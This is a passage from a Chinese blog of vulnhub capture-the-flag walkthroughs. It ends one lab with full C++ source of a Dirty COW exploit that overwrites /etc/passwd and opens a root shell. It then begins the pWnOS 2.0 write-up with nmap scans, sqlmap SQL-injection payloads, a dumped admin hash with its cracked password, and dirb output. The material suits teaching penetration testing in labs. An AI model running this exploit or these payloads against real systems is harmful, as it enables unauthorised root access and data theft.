class="line">   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;</span><br><span class="line">   <span class="keyword">if</span>(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &amp;termOld);</span><br><span class="line">   <span class="keyword">if</span>(child != 0) <span class="built_in">wait</span>(&amp;wstat); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Dcow::exitOnError(string msg)&#123;</span><br><span class="line">      cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">      // <span class="keyword">if</span>(child != 0) <span class="built_in">kill</span>(child, SIGKILL);</span><br><span class="line">      throw new exception();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int  Dcow::expl(void)&#123;</span><br><span class="line">   madviseThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(run)&#123; madvise(map, etcPwdBak.size(), MADV_DONTNEED);&#125; &#125;);</span><br><span class="line">   writerThr  = new thread([&amp;]()&#123; int fpsm = open(PSM,O_RDWR);  </span><br><span class="line">                                  <span class="keyword">while</span>(run)&#123; lseek(fpsm, reinterpret_cast&lt;off_t&gt;(map), SEEK_SET); </span><br><span class="line">                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">   checkerThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">                                         extPwd-&gt;clear(); extPwd-&gt;seekg(0, ios::beg); </span><br><span class="line">                                         buffer.assign(istreambuf_iterator&lt;char&gt;(*extPwd),</span><br><span class="line">                                                       istreambuf_iterator&lt;char&gt;());</span><br><span class="line">                                         <span class="keyword">if</span>(buffer.find(<span class="built_in">pwd</span>) != string::npos &amp;&amp; </span><br><span class="line">                                            buffer.size() &gt;= etcPwdBak.size())&#123;</span><br><span class="line">                                                run = <span class="literal">false</span>; <span class="built_in">break</span>;</span><br><span class="line">                                         &#125;</span><br><span class="line">                                         iter ++; usleep(300000);</span><br><span class="line">                                   &#125;</span><br><span class="line">                                   run = <span class="literal">false</span>;</span><br><span class="line">                                 &#125;);</span><br><span class="line"></span><br><span class="line">  cerr &lt;&lt; <span class="string">&quot;Running ...&quot;</span> &lt;&lt; endl;</span><br><span class="line">  madviseThr-&gt;join();</span><br><span class="line">  writerThr-&gt;join();</span><br><span class="line">  checkerThr-&gt;join();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">       child = forkpty(&amp;master, nullptr, nullptr, nullptr);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == -1) exitOnError(<span class="string">&quot;Error forking pty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == 0)&#123; </span><br><span class="line">          execlp(<span class="string">&quot;su&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;-&quot;</span>, nullptr);</span><br><span class="line">          exitOnError(<span class="string">&quot;Error on exec.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(opShell) cerr &lt;&lt; <span class="string">&quot;Password overridden to: &quot;</span> &lt;&lt;  TXTPWD &lt;&lt; endl;</span><br><span class="line">       memset(buffv, 0, BUFFSIZE);</span><br><span class="line">       ssize_t bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">       <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading  su prompt.&quot;</span>);</span><br><span class="line">       cerr &lt;&lt; <span class="string">&quot;Received su prompt (&quot;</span> &lt;&lt; buffv &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, TXTPWD, strlen(TXTPWD)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing pwd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, DISABLEWB, strlen(DISABLEWB)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing cmd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(!opShell)&#123;</span><br><span class="line">            <span class="keyword">if</span>(write(master, EXITCMD, strlen(EXITCMD)) &lt;= 0) </span><br><span class="line">                 exitOnError(<span class="string">&quot;Error writing exit cmd on tty.&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(restPwd)&#123;</span><br><span class="line">               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(<span class="string">&quot; &quot;</span>).append(PWDFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd on tty.&quot;</span>);</span><br><span class="line">               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd (rm) on tty.&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(tcgetattr(STDIN_FILENO, &amp;termOld) == -1 )</span><br><span class="line">                exitOnError(<span class="string">&quot;Error getting terminal attributes.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">           termNew               = termOld;</span><br><span class="line">           termNew.c_lflag       &amp;= static_cast&lt;unsigned long&gt;(~(ICANON | ECHO));</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(tcsetattr(STDIN_FILENO, TCSANOW, &amp;termNew) == -1)</span><br><span class="line">                exitOnError(<span class="string">&quot;Error setting terminal in non-canonical mode.&quot;</span>);</span><br><span class="line">           rawMode = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                FD_ZERO(&amp;rfds);</span><br><span class="line">                FD_SET(master, &amp;rfds);</span><br><span class="line">                FD_SET(STDIN_FILENO, &amp;rfds);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(select(master + 1, &amp;rfds, nullptr, nullptr, nullptr) &lt; 0 )</span><br><span class="line">                    exitOnError(<span class="string">&quot;Error on select tty.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(master, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) <span class="built_in">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)</span><br><span class="line">                          exitOnError(<span class="string">&quot;Error writing on stdout.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(STDIN_FILENO, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(STDIN_FILENO, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading from stdin.&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(write(master, buffv, bytes_read) != bytes_read) <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">return</span> [](int ret, bool shell)&#123; </span><br><span class="line">       string msg = shell ? <span class="string">&quot;Exit.\n&quot;</span> : string(<span class="string">&quot;Root password is:   &quot;</span>) + TXTPWD + <span class="string">&quot;Enjoy! :-)\n&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(ret &lt;= MAXITER)&#123;cerr &lt;&lt; msg; <span class="built_in">return</span> 0;&#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;cerr &lt;&lt; <span class="string">&quot;Exploit failed.\n&quot;</span>; <span class="built_in">return</span> 1;&#125; </span><br><span class="line">  &#125;(iter, opShell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printInfo(char* cmd)&#123;</span><br><span class="line">      cerr &lt;&lt; cmd &lt;&lt; <span class="string">&quot; [-s] [-n] | [-h]\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -s  open directly a shell, if the exploit is successful;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -n  combined with -s, doesn&#x27;t restore the passwd file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -h  print this synopsis;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot;\n If no param is specified, the program modifies the passwd file and exits.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; A copy of the passwd file will be create in the current directory as .ssh_bak&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; (unprivileged user), if no parameter or -n is specified.\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line">   const char  flags[]   = <span class="string">&quot;shn&quot;</span>;</span><br><span class="line">   int         c;</span><br><span class="line">   bool        opShell   = <span class="literal">false</span>,</span><br><span class="line">               restPwd   = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">   opterr = 0;</span><br><span class="line">   <span class="keyword">while</span> ((c = getopt(argc, argv, flags)) != -1)&#123;</span><br><span class="line">      switch (c)&#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            opShell = <span class="literal">true</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            restPwd = <span class="literal">false</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         default:</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter.&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!restPwd &amp;&amp; !opShell)&#123;</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter: -n requires -s&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   Dcow dcow(opShell, restPwd);</span><br><span class="line">   <span class="built_in">return</span> dcow.expl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong><em>此外UDP69端口开放也可以使用tftp下载backup.tar文件</em></strong></font></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>文件包含</li>
<li>php://filter/convert.base64-encode协议加密传输下载文件</li>
<li>ssh key 登录shell</li>
<li>vim命令设置shell并跳至shell</li>
<li>Exim-4.84-3-本地提权</li>
<li>脏牛提权(dirty cow)</li>
<li>udp66端口tftp文件下载</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[pWnOS2.0-Pre-Release]</title>
    <url>/2019/12/14/pWnOS2-0-Pre-Release/</url>
    <content><![CDATA[<p>名称：pWnOS：2.0（预发布）<br>发布日期：2011年7月4日</p>
<p>下载：<br>Download: <span class="exturl" data-url="aHR0cDovL3B3bm9zLmNvbS9maWxlcy9wV25PU192Mi4wLjd6">http://pwnos.com/files/pWnOS_v2.0.7z<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192Mi4wLjd6">https://download.vulnhub.com/pwnos/pWnOS_v2.0.7z<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192Mi4wLjd6LnRvcnJlbnQ=">https://download.vulnhub.com/pwnos/pWnOS_v2.0.7z.torrent<i class="fa fa-external-link-alt"></i></span></p>
<p>描述：</p>
<p>pWnOS v2.0（预发布！）</p>
<p>目标：<br>root…赢！<br>关于：<br>pWnOS v2.0是一个Virutal机器映像，它托管一台服务器以进行实践渗透测试。 它将测试您利用服务器的能力，并包含多个达到目标（根）的入口点。 它是为与WMWare Workstation 7.0一起使用而设计的，但也可以与大多数其他虚拟机软件一起使用。</p>
<a id="more"></a>

<p>配置和设置：<br>将攻击平台配置为在10.10.10.0/24网络范围内<br>例如，将BackTrack 5网络适配器静态设置为IP地址为10.10.10.200且网络掩码为255.255.255.0。</p>
<p>VMWare的网络适配器设置为桥接网络适配器<br>您可能需要根据设置将VMWare的网络适配器更改为NAT或仅主机</p>
<p>服务器的IP静态设置为10.10.10.100</p>
<p>服务器的网络设置：<br>IP：10.10.10.100<br>网路遮罩：255.255.255.0<br>网关：10.10.10.15</p>
<p>漏洞：</p>
<ul>
<li>不安全的文件处理</li>
<li>纯文本密码</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><p>对于白中白的小盆友，可能网络都配置不来，就按下面图片中的配置即可，然后测试网络可达性。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub56.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ping 10.10.10.100</span></span><br><span class="line">PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.10.10.100: icmp_seq=1 ttl=64 time=0.223 ms</span><br><span class="line">64 bytes from 10.10.10.100: icmp_seq=2 ttl=64 time=0.414 ms</span><br><span class="line">64 bytes from 10.10.10.100: icmp_seq=3 ttl=64 time=0.342 ms</span><br><span class="line">64 bytes from 10.10.10.100: icmp_seq=4 ttl=64 time=0.357 ms</span><br><span class="line">64 bytes from 10.10.10.100: icmp_seq=5 ttl=64 time=0.416 ms</span><br><span class="line">^C</span><br><span class="line">--- 10.10.10.100 ping statistics ---</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss, time 4092ms</span><br><span class="line">rtt min/avg/max/mdev = 0.223/0.350/0.416/0.070 ms</span><br></pre></td></tr></table></figure>

<p>nice done!!!</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap伺候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|       httponly flag not <span class="built_in">set</span></span><br><span class="line">|   /login.php: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|       httponly flag not <span class="built_in">set</span></span><br><span class="line">|   /login/: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|       httponly flag not <span class="built_in">set</span></span><br><span class="line">|   /index/: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|       httponly flag not <span class="built_in">set</span></span><br><span class="line">|   /register/: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.100</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://10.10.10.100:80/login.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://10.10.10.100:80/register.php</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: register.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /blog/: Blog</span></span><br><span class="line"><span class="string">|   /login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /login/: Login page</span></span><br><span class="line"><span class="string">|   /info.php: Possible information file</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|   /includes/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.17 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /info/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /register/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.17 (Ubuntu)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub57.jpg"><br>来到登录口，发现有注入，直接sqlmap一波。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D ch16 -T users --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                        </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                                                                                           </span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |                                                                                                                                           </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                                                                                           </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                         </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 05:56:36 /2019-12-15/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[05:56:36] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[05:56:36] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: email (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: email=124123&#x27;</span> OR NOT 3619=3619<span class="comment">#&amp;pass=dvfvsdfvsdf&amp;submit=Login&amp;submitted=TRUE</span></span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: email=124123<span class="string">&#x27; AND (SELECT 1325 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(1325=1325,1))),0x7170627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- gsUK&amp;pass=dvfvsdfvsdf&amp;submit=Login&amp;submitted=TRUE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: email=124123&#x27;</span> AND (SELECT 5062 FROM (SELECT(SLEEP(5)))bAlG)-- SXBw&amp;pass=dvfvsdfvsdf&amp;submit=Login&amp;submitted=TRUE</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 8 columns</span><br><span class="line">    Payload: email=124123<span class="string">&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170706a71,0x564e4f70794e7171465a644f695056686b6e54576e757163667a7476486252574f76717264665950,0x7170627171),NULL,NULL,NULL,NULL#&amp;pass=dvfvsdfvsdf&amp;submit=Login&amp;submitted=TRUE</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] fetching columns for table &#x27;</span>users<span class="string">&#x27; in database &#x27;</span>ch16<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] used SQL query returns 8 entries</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>user_id<span class="string">&#x27;,&#x27;</span>int(10) unsigned<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>first_name<span class="string">&#x27;,&#x27;</span>varchar(20)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>last_name<span class="string">&#x27;,&#x27;</span>varchar(40)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>email<span class="string">&#x27;,&#x27;</span>varchar(80)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>pass<span class="string">&#x27;,&#x27;</span>char(40)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>user_level<span class="string">&#x27;,&#x27;</span>tinyint(1) unsigned<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>active<span class="string">&#x27;,&#x27;</span>char(32)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] resumed: &#x27;</span>registration_date<span class="string">&#x27;,&#x27;</span>datetime<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] fetching entries for table &#x27;</span>users<span class="string">&#x27; in database &#x27;</span>ch16<span class="string">&#x27;                                                                                            </span></span><br><span class="line"><span class="string">[05:56:36] [INFO] used SQL query returns 1 entry</span></span><br><span class="line"><span class="string">[05:56:36] [INFO] recognized possible password hashes in column &#x27;</span>pass<span class="string">&#x27;</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n</span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] n</span></span><br><span class="line"><span class="string">Database: ch16</span></span><br><span class="line"><span class="string">Table: users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+</span></span><br><span class="line"><span class="string">| user_id | pass                                     | email            | active | last_name | first_name | user_level | registration_date   |</span></span><br><span class="line"><span class="string">+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+</span></span><br><span class="line"><span class="string">| 1       | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af | admin@isints.com | NULL   | Privett   | Dan        | 0          | 2011-05-07 17:27:01 |</span></span><br><span class="line"><span class="string">+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[05:56:39] [INFO] table &#x27;</span>ch16.users<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/10.10.10.100/dump/ch16/users.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[05:56:39] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/10.10.10.100<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 05:56:39 /2019-12-15/</span></span><br></pre></td></tr></table></figure>

<p>sha1加密的hash值c2c4b4e51d9e23c02c15702c136c3e950ba9a4af解密得到killerbeesareflying,使用邮箱和该密码登录没有发现任何内容</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub58.jpg"></p>
<p>dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://10.10.10.100/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 05:59:36 2019</span><br><span class="line">URL_BASE: http://10.10.10.100/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.100/ ----</span><br><span class="line">+ http://10.10.10.100/activate (CODE:302|SIZE:0)                                                                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/                                                                                                                           </span><br><span class="line">+ http://10.10.10.100/cgi-bin/ (CODE:403|SIZE:288)                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/includes/                                                                                                                       </span><br><span class="line">+ http://10.10.10.100/index (CODE:200|SIZE:854)                                                                                                                    </span><br><span class="line">+ http://10.10.10.100/index.php (CODE:200|SIZE:854)                                                                                                                </span><br><span class="line">+ http://10.10.10.100/info (CODE:200|SIZE:50175)                                                                                                                   </span><br><span class="line">+ http://10.10.10.100/info.php (CODE:200|SIZE:50044)                                                                                                               </span><br><span class="line">+ http://10.10.10.100/login (CODE:200|SIZE:1174)                                                                                                                   </span><br><span class="line">+ http://10.10.10.100/register (CODE:200|SIZE:1562)                                                                                                                </span><br><span class="line">+ http://10.10.10.100/server-status (CODE:403|SIZE:293)                                                                                                            </span><br><span class="line">                                                                                                                                                                   </span><br><span class="line">---- Entering directory: http://10.10.10.100/blog/ ----</span><br><span class="line">+ http://10.10.10.100/blog/add (CODE:302|SIZE:0)                                                                                                                   </span><br><span class="line">+ http://10.10.10.100/blog/atom (CODE:200|SIZE:1062)                                                                                                               </span><br><span class="line">+ http://10.10.10.100/blog/categories (CODE:302|SIZE:0)                                                                                                            </span><br><span class="line">+ http://10.10.10.100/blog/comments (CODE:302|SIZE:0)                                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/config/                                                                                                                    </span><br><span class="line">+ http://10.10.10.100/blog/contact (CODE:200|SIZE:5918)                                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/content/                                                                                                                   </span><br><span class="line">+ http://10.10.10.100/blog/delete (CODE:302|SIZE:0)                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/docs/                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/flash/                                                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/images/                                                                                                                    </span><br><span class="line">+ http://10.10.10.100/blog/index (CODE:200|SIZE:8094)                                                                                                              </span><br><span class="line">+ http://10.10.10.100/blog/index.php (CODE:200|SIZE:8094)                                                                                                          </span><br><span class="line">+ http://10.10.10.100/blog/info (CODE:302|SIZE:0)                                                                                                                  </span><br><span class="line">+ http://10.10.10.100/blog/info.php (CODE:302|SIZE:0)                                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/interface/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/languages/                                                                                                                 </span><br><span class="line">+ http://10.10.10.100/blog/login (CODE:200|SIZE:5667)                                                                                                              </span><br><span class="line">+ http://10.10.10.100/blog/<span class="built_in">logout</span> (CODE:302|SIZE:0)                                                                                                                </span><br><span class="line">+ http://10.10.10.100/blog/options 